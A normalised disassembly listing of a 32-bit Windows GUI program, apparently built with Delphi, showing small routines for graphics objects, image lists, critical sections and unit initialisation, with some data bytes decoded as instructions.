jmp sub_4038ec
sub_41c403
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c46b
jmp sub_4038ec
sub_41c472
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c515
jmp sub_4038ec
sub_41c51c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c974
push 0x33
mov ecx rw-data
call sub_413af8
retn
sub_41c984
push 0x33
mov ecx rw-data
call sub_413ab8
retn
sub_41c994
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41c9b8
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_41cb8c
push 0x11
mov ecx rw-data
call sub_413ab8
retn
sub_41cccc
push ebx
mov ebx eax
mov eax ebx
call sub_41c994
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_41cd86
jmp sub_4038ec
sub_41cd8d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c9b8
retn
sub_41cda3
jmp sub_4038ec
sub_41cdbc
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41ce19
jmp sub_4038ec
sub_41ce20
pop ebx
pop ecx
pop ebp
retn
sub_41cf99
jmp sub_4038ec
sub_41cfc1
jmp sub_4038ec
sub_41cfc8
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41d034
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_40414c
pop esi
pop ebx
retn
sub_41d0a8
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_41d004
push eax
call MulDiv
neg eax
pop ebx
retn
sub_41d0e4
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_41d11c
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_41d14c
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_41d26a
jmp sub_4038ec
sub_41d271
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c9b8
retn
sub_41d287
jmp sub_4038ec
sub_41d2fd
jmp sub_4038ec
sub_41d304
pop ebx
pop ecx
pop ebp
retn
sub_41d3be
jmp sub_4038ec
sub_41d3f0
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_403394
sub_41d543
jmp sub_4038ec
sub_41d54a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c9b8
retn
sub_41d560
jmp sub_4038ec
sub_41d5d9
jmp sub_4038ec
sub_41d5e0
pop ebx
pop ecx
pop ebp
retn
sub_41d719
jmp sub_4038ec
sub_41da6c
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_41dc48
jmp sub_4038ec
sub_41dc4f
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_41dc58
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_41dc90
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41dc9c
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41dddc
retn
sub_41dea5
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_41debc
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41dfa8
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41dfc8
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41dfe8
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41e008
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
pop ebx
retn
sub_41e020
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
pop ebx
retn
sub_41e044
mov eax [ rw-data ]
call sub_41e020
retn
sub_41e0a6
jmp sub_4038ec
sub_41e0ad
pop ecx
pop ebp
retn
sub_41e14c
jmp sub_4038ec
sub_41e153
pop ebx
mov esp ebp
pop ebp
retn
sub_41e225
jmp sub_4038ec
sub_41e2b6
jmp sub_4038ec
sub_41e2bd
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e2e8
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_41e3cf
jmp sub_4038ec
sub_41e57c
jmp sub_4038ec
sub_41e583
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_41e795
jmp sub_4038ec
sub_41e79c
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_41e836
jmp sub_4038ec
sub_41ea12
jmp sub_4038ec
sub_41eacc
jmp sub_4038ec
sub_41ead3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eaf3
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41eaec
jmp sub_4038ec
sub_41eaf3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41ec81
jmp sub_4038ec
sub_41ee4c
jmp sub_4038ec
sub_41ee53
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ee76
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_4026fc
retn
sub_41ee6f
jmp sub_4038ec
sub_41ee76
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ee96
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4026fc
retn
sub_41ee8f
jmp sub_4038ec
sub_41ee96
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_41eea0
xor ecx ecx
mov edx eax
add eax 0x14
jmp r-xdata
cmp edx eax
jl r-xdata
xor cx [ edx ]
add edx 0x2
mov eax ecx
retn
sub_41f000
push 0x0
call sub_41ef9c
retn
sub_41f0a5
jmp sub_4038ec
sub_41f0ac
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41f0b8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_41f008
pop ebx
pop ebp
retn 0x4
sub_41f0cc
retn
sub_41f0d0
test eax eax
jne r-xdata
retn
call sub_41f0cc
sub_41f2a3
jmp sub_4038ec
sub_41f2ca
jmp sub_4038ec
sub_41f2d1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f310
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_41f4dd
mov eax [ ebp - 0xc ]
call sub_403198
retn
sub_41f4e6
jmp sub_4038ec
j_sub_41f4dd
jmp sub_41f4dd
sub_41f4ed
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403198
retn
sub_41f503
jmp sub_4038ec
sub_41f514
xor eax eax
retn
sub_41f518
mov al [ eax + 0x21 ]
retn
sub_41f564
jmp sub_4038ec
sub_41f56b
pop esi
pop ecx
pop ebp
retn
sub_41f598
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_41f5ef
jmp sub_4038ec
sub_41f5f6
pop esi
pop ecx
pop ebp
retn
sub_41f5fc
retn
sub_41f600
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_41f610
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_41f67d
xor eax [ eax ]
hlt
sub_41f795
jmp sub_4038ec
sub_41f79c
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_41f8bb
jmp sub_4038ec
sub_41f8c2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41f953
jmp sub_4038ec
sub_41f95a
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f9e2
jmp sub_4038ec
sub_41f9e9
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41fb73
jmp sub_4038ec
sub_41fb7a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41fc15
xor eax [ eax ]
hlt
sub_41fd30
jmp sub_403638
sub_41fd54
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f6b8
mov [ rw-data ] eax
sub_41fd74
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fc40
mov [ rw-data ] eax
sub_41fe9c
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_41fe38
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_41ff44
jmp sub_403638
sub_420027
jmp sub_403638
sub_420088
jmp sub_4038ec
sub_42008f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420098
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_41fe9c
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
pop ebx
retn
sub_4200b0
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_41fe9c
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop edi
pop esi
retn
sub_4201f9
jmp sub_403638
sub_420277
jmp sub_4038ec
sub_42027e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420418
retn
sub_4205b8
cmp [ eax + 0x28 ] 0x0
sete al
retn
sub_4208bc
jmp sub_4038ec
sub_4208c3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420a3b
jmp sub_4038ec
sub_420a42
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420ad1
jmp sub_4038ec
sub_420ad8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420afa
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f0c
retn
sub_420af3
jmp sub_4038ec
sub_420afa
pop ebx
mov esp ebp
pop ebp
retn
sub_420b0d
add [ eax ] al
add [ ebx + 0x74002878 ] al
adc al [ eax + 0x74002c78 ]
pop es
call sub_420df4
jmp r-xdata
retn
sub_420b23
call sub_420e80
retn
sub_420c18
retn
sub_420e70
jmp sub_4038ec
sub_420f9b
jmp sub_4038ec
sub_420fa2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_420fbb
jmp sub_4038ec
sub_4210b5
xor eax [ eax ]
hlt
sub_421192
jmp sub_4038ec
sub_4211ba
jmp sub_4038ec
sub_4211c1
mov esp ebp
pop ebp
retn
sub_421238
jmp sub_4038ec
sub_421340
jmp sub_4038ec
sub_42142b
jmp sub_4038ec
sub_421438
inc [ eax + 0x4 ]
retn
sub_4215b3
jmp sub_4038ec
sub_421964
jmp sub_4038ec
sub_421bae
jmp sub_4038ec
sub_421bd8
jmp sub_4038ec
sub_421bdf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421c01
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_421bfa
jmp sub_4038ec
sub_421c0b
jmp sub_403638
sub_421c5a
jmp sub_4038ec
sub_421e87
jmp sub_4038ec
sub_421ecf
jmp sub_4038ec
sub_42203c
jmp sub_4038ec
sub_422103
jmp sub_403638
sub_422158
mov [ eax + 0x31 ] 0x0
call sub_41f310
retn
sub_4223a9
jmp sub_4038ec
sub_422414
jmp sub_4038ec
sub_42241b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42248c
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_422540
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_422550
push ebx
mov ebx eax
mov eax ebx
call sub_422708
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_422564
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_422580
push ebx
mov ebx eax
mov eax ebx
call sub_422768
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_4225dc
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_4226eb
jmp sub_4038ec
sub_42291c
jmp sub_4038ec
sub_422923
pop ebx
pop ecx
pop ebp
retn
sub_4229af
jmp sub_403638
sub_422a0f
jmp sub_4038ec
sub_422a16
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_422df7
jmp sub_4038ec
sub_422e23
jmp sub_4038ec
sub_422e8a
jmp sub_403638
sub_422ebb
jmp sub_4038ec
sub_422f40
jmp sub_403638
sub_422f45
mov eax [ ebp - 0x38 ]
call sub_403198
call sub_40394c
call sub_4039a0
sub_422f57
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422f74
mov eax [ ebp - 0x18 ]
call sub_4026fc
retn
sub_422f6d
jmp sub_4038ec
sub_4230c3
jmp sub_403638
sub_42338f
jmp sub_403638
sub_423470
mov cl 0x1
call sub_423478
retn
sub_42372d
add [ eax ] al
add [ ebx ] dh
leave
call sub_423478
retn
sub_4237b2
jmp sub_403638
sub_4237b7
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_40394c
call sub_4039a0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_423808
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_423941
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_423970
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_423984
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_423a9d
jmp sub_403638
sub_423b52
jmp sub_403638
sub_423bbc
jmp sub_403638
sub_423bf0
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_423b7c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_423c08
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41e008
retn
mov [ eax + 0x30 ] edx
retn
sub_423c20
retn
sub_423c24
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41e008
retn
mov [ eax + 0x2c ] edx
retn
sub_423c64
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41e008
pop ebp
retn 0x4
sub_423c78
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41e008
pop ebp
retn 0x4
sub_423ccd
jmp sub_4038ec
sub_423cd4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423dfd
xor eax [ eax ]
hlt
sub_423e88
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_423e94
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_423f41
jmp sub_4038ec
sub_423f48
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_424033
jmp sub_403638
sub_42409f
jmp sub_4038ec
sub_4241cd
jmp sub_4038ec
sub_4241d4
pop ebp
retn
sub_424309
jmp sub_4038ec
sub_424310
pop ebp
retn
sub_424314
sub [ rw-data ] 0x1
retn
sub_424351
xor eax [ eax ]
hlt
sub_42455c
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_414098
retn
sub_424590
mov eax [ eax + 0x4 ]
call sub_413eec
retn
sub_4245c1
jmp sub_4038ec
sub_4245c8
pop ebp
retn
sub_4245cc
sub [ rw-data ] 0x1
retn
ImageList_Create
jmp [ __import_lookup_table_12(comctl32:ImageList_Create) ]
ImageList_Destroy
jmp [ __import_lookup_table_12(comctl32:ImageList_Destroy) ]
ImageList_GetImageCount
jmp [ __import_lookup_table_12(comctl32:ImageList_GetImageCount) ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
ImageList_Replace
jmp [ ImageList_Replace@IAT ]
ImageList_Remove
jmp [ ImageList_Remove@IAT ]
ImageList_BeginDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_BeginDrag) ]
ImageList_EndDrag
jmp [ ImageList_EndDrag@IAT ]
ImageList_DragEnter
jmp [ ImageList_DragEnter@IAT ]
ImageList_DragLeave
jmp [ ImageList_DragLeave@IAT ]
ImageList_DragMove
jmp [ ImageList_DragMove@IAT ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ __import_lookup_table_12(comctl32:ImageList_GetDragImage) ]
ImageList_Read
jmp [ __import_lookup_table_12(comctl32:ImageList_Read) ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ __import_lookup_table_12(comctl32:ImageList_SetIconSize) ]
sub_4246bd
jmp sub_4038ec
sub_4246c4
pop ebp
retn
sub_4246c8
sub [ rw-data ] 0x1
retn
sub_42478f
jmp sub_4038ec
sub_424796
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_424dac
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_4247b8
mov [ rw-data ] sub_4248d0
mov [ rw-data ] sub_424840
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_424ad4
mov [ rw-data ] sub_424ba8
mov [ rw-data ] sub_424c7c
retn
sub_424e3d
jmp sub_4038ec
sub_424e44
pop ebp
retn
sub_424e48
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_424dac
sub_424e7d
jmp sub_4038ec
sub_424e84
pop ebp
retn
sub_424e88
sub [ rw-data ] 0x1
retn
sub_425021
xor eax [ eax ]
hlt
sub_4250c1
add eax 0xffffffd8
jmp sub_425d48
sub_4250c9
add eax 0xffffffd8
jmp sub_425d4c
sub_4250d1
add eax 0xffffffd8
jmp sub_425d60
sub_4250e3
add [ esp + 0x4 ] 0xffffffd8
jmp sub_405708
sub_4250ed
add [ esp + 0x4 ] 0xffffffd8
jmp sub_40571c
sub_4250f7
add eax 0xffffffd4
jmp sub_425818
sub_4250ff
add eax 0xffffffd4
jmp sub_425a2c
sub_425107
add eax 0xffffffd4
jmp sub_425b40
sub_425117
add eax 0xffffffd4
jmp sub_425c44
sub_42511f
add eax 0xffffffd4
jmp sub_425ca0
sub_425131
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405708
sub_42513b
add [ esp + 0x4 ] 0xffffffd4
jmp sub_40571c
sub_4252ca
jmp sub_4038ec
sub_4252d1
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4254e1
jmp sub_4038ec
sub_4254e8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42569d
jmp sub_4038ec
sub_425702
jmp sub_4038ec
sub_425709
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4257f5
jmp sub_4038ec
sub_4257fc
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_425a0c
lea eax [ ebp - 0x30 ]
call sub_403ee8
lea eax [ ebp - 0x20 ]
call sub_403ee8
retn
sub_425a1d
jmp sub_4038ec
j_sub_425a0c
jmp sub_425a0c
sub_425a24
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425b1f
jmp sub_4038ec
sub_425b26
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425b40
call sub_425570
retn
sub_425c23
jmp sub_4038ec
sub_425c2a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425c8a
lea eax [ ebp - 0x4 ]
call sub_405634
retn
sub_425c93
jmp sub_4038ec
j_sub_425c8a
jmp sub_425c8a
sub_425c9a
pop ebx
pop ecx
pop ebp
retn
sub_425d35
jmp sub_4038ec
sub_425d3c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_425d48
mov eax [ eax + 0x20 ]
retn
sub_425d4c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x24 ]
call sub_403f3c
pop esi
pop ebx
retn
sub_425e77
jmp sub_4038ec
sub_425e7e
pop ebp
retn
sub_425e80
sub [ rw-data ] 0x1
retn
sub_425ead
jmp sub_4038ec
sub_425eb4
pop ebp
retn
sub_425eb8
sub [ rw-data ] 0x1
retn
sub_425ef1
jmp sub_4038ec
sub_425ef8
pop ebp
retn
sub_425efc
sub [ rw-data ] 0x1
retn
sub_426209
jmp sub_4038ec
sub_426210
pop ebp
retn
sub_426214
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_425f60
sub_426259
xor eax [ eax ]
hlt
sub_4262bd
xor eax [ eax ]
hlt
sub_4262f4
retn
sub_426368
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_426374
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_426380
mov edx [ eax ]
call [ edx ]
retn
sub_426388
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_4263b5
jmp sub_4038ec
sub_4263bc
pop ebp
retn
sub_4263c0
sub [ rw-data ] 0x1
retn
sub_42657f
jmp sub_4038ec
sub_426586
pop ebp
retn
sub_42693b
jmp sub_4038ec
sub_426942
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_426d5c
jmp sub_4038ec
sub_426d63
pop ebp
retn
sub_426d68
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4262f8
mov [ rw-data ] eax
sub_426da9
jmp sub_4038ec
sub_426db0
pop ebp
retn
sub_426db4
sub [ rw-data ] 0x1
retn
sub_426de1
jmp sub_4038ec
sub_426de8
pop ebp
retn
sub_426dec
sub [ rw-data ] 0x1
retn
sub_426e19
jmp sub_4038ec
sub_426e20
pop ebp
retn
sub_426e24
sub [ rw-data ] 0x1
retn
sub_426e51
jmp sub_4038ec
sub_426e58
pop ebp
retn
sub_426e5c
sub [ rw-data ] 0x1
retn
sub_426e89
jmp sub_4038ec
sub_426e90
pop ebp
retn
sub_426e94
sub [ rw-data ] 0x1
retn
sub_426ec1
jmp sub_4038ec
sub_426ec8
pop ebp
retn
sub_426ecc
sub [ rw-data ] 0x1
retn
sub_426f2d
jmp sub_4038ec
sub_426f34
pop ebp
retn
sub_426f38
sub [ rw-data ] 0x1
retn
GetOpenFileNameA
jmp [ GetOpenFileNameA@IAT ]
sub_426f6d
jmp sub_4038ec
sub_426f74
pop ebp
retn
sub_426f78
sub [ rw-data ] 0x1
retn
sub_426fa5
jmp sub_4038ec
sub_426fac
pop ebp
retn
sub_426fb0
sub [ rw-data ] 0x1
retn
sub_427454
jmp r-xdata
sub_427456
0x6cffe9ff 0x427c
sub_4278a6
jmp sub_403638
sub_4278ab
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45a544
call sub_4039a0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4278c8
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_4278d0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_403394
pop esi
retn
sub_4278e8
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_403394
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_427900
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_4279a9
jmp sub_4038ec
sub_4279d7
jmp sub_4038ec
sub_4279de
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4279e8
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4279fc
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_427c94
push ebx
cmp [ eax + 0x8a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_427cb4
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_427cd4
push ebx
cmp [ eax + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
sub_427d26
jmp sub_4038ec
sub_427d2d
pop ecx
pop ebp
retn
sub_428075
jmp sub_4038ec
sub_42807c
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4281b5
jmp sub_4038ec
sub_4281bc
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42827b
jmp sub_4038ec
sub_428282
pop ebx
mov esp ebp
pop ebp
retn
sub_428334
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ eax + 0x64 ]
retn
mov eax [ eax + 0x68 ]
retn
sub_42839c
push ebx
mov ebx eax
mov edx GetOpenFileNameA
mov eax ebx
call sub_427dc4
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_4283b4
push ebx
cmp [ eax + 0xaa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_428592
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x340047b7 ] bl
rol [ edi ] 0x0
add [ eax ] al
add [ edi + esi * 4 - 0x3c9bffb9 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x57ffb849 ] dl
retn
sub_42861a
jmp sub_4038ec
sub_428621
pop ebp
retn
sub_42a150
xor edx edx
mov ecx [ eax + 0x168 ]
mov ecx [ ecx + 0xc ]
test ecx ecx
je r-xdata
